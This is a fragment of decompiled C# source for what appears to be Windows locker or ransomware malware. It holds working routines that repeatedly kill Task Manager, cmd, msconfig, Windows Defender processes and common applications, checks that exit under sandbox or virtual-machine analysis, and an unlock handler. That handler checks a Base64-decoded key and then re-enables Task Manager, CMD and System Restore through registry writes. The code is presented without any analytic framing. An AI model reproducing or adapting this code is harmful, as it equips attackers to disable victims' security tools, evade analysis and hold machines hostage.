		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.MainWindowTitle.Contains(title))
				{
					process.Kill();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void AntiChecker(string processname)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (Operators.CompareString(process.ProcessName, processname, false) == 0)
				{
					try
					{
						process.Kill();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.EndApp();
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private static void AntiThreatExpert()
	{
		if (Process.GetCurrentProcess().MainModule!.FileName!.Contains("sample"))
		{
			Environment.Exit(0);
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	public static void IsVmWare()
	{
		string lpClassName = "VMDragDetectWndClass";
		string lpWindowName = null;
		long num = FindWindowA(ref lpClassName, ref lpWindowName);
		if (num == 0L)
		{
			Environment.Exit(0);
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 278:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0016;
						case 4:
							goto IL_0023;
						case 5:
							goto IL_0030;
						case 6:
							goto IL_003d;
						case 7:
							goto IL_0045;
						case 8:
							goto IL_0052;
						case 9:
							goto IL_005f;
						case 10:
							goto IL_006d;
						case 11:
							goto IL_007b;
						case 12:
							goto IL_0089;
						case 13:
							goto IL_0097;
						case 14:
							goto IL_00a5;
						case 15:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 16:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00a5:
					num = 14;
					KillProcess("MSASCui");
					break;
					IL_0097:
					num = 13;
					KillProcess("notepad++");
					goto IL_00a5;
					IL_0009:
					num = 2;
					KillProcess("taskmgr");
					goto IL_0016;
					IL_0016:
					num = 3;
					KillProcess("cmd");
					goto IL_0023;
					IL_0023:
					num = 4;
					KillProcess("msconfig");
					goto IL_0030;
					IL_0030:
					num = 5;
					KillProcess("Run");
					goto IL_003d;
					IL_003d:
					ProjectData.ClearProjectError();
					num3 = -3;
					goto IL_0045;
					IL_0045:
					num = 7;
					KillProcess("MSN");
					goto IL_0052;
					IL_0052:
					num = 8;
					KillProcess("WINWORD");
					goto IL_005f;
					IL_005f:
					num = 9;
					KillProcess("Steam");
					goto IL_006d;
					IL_006d:
					num = 10;
					KillProcess("Spotify");
					goto IL_007b;
					IL_007b:
					num = 11;
					KillProcess("Notepad");
					goto IL_0089;
					IL_0089:
					num = 12;
					KillProcess("Origin");
					goto IL_0097;
					end_IL_0001_2:
					break;
				}
				num = 15;
				KillProcess("msmpeng");
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 278;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void VTheme1_Click(object sender, EventArgs e)
	{
	}

	private void InfluenceTextBox1_Click(object sender, EventArgs e)
	{
	}

	private void VTheme1_Click_1(object sender, EventArgs e)
	{
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void InfluenceButton2_Click_1(object sender, EventArgs e)
	{
		((Control)InfluenceTextBox1).set_Enabled(false);
		string @string = Encoding.UTF8.GetString(FromBase64(TextBox2.get_Text()));
		if (Operators.CompareString(((Control)InfluenceTextBox1).get_Text(), @string, false) == 0)
		{
			RemoveReg(((Form)this).get_Text());
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"0", RegistryValueKind.DWord);
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"0", RegistryValueKind.DWord);
			string text = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
			((ServerComputer)MyProject.Computer).get_Registry().SetValue(text, "Hidden", (object)"1", RegistryValueKind.DWord);
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"0", RegistryValueKind.DWord);
			ProjectData.EndApp();
		}
		else
		{
			((Control)MyProject.Forms.Form2).Show();
			MyProject.Forms.Form2.PictureBox1.set_Image(MyProject.Forms.Form2.PictureBox2.get_Image());
		}
		((Control)InfluenceTextBox1).set_Enabled(true);
	}

	private void InfluenceButton1_Click_1(object sender, EventArgs e)
	{
		string @string = Encoding.UTF8.GetString(FromBase64(TextBox1.get_Text()));
		Process.Start(@string);
	}
}
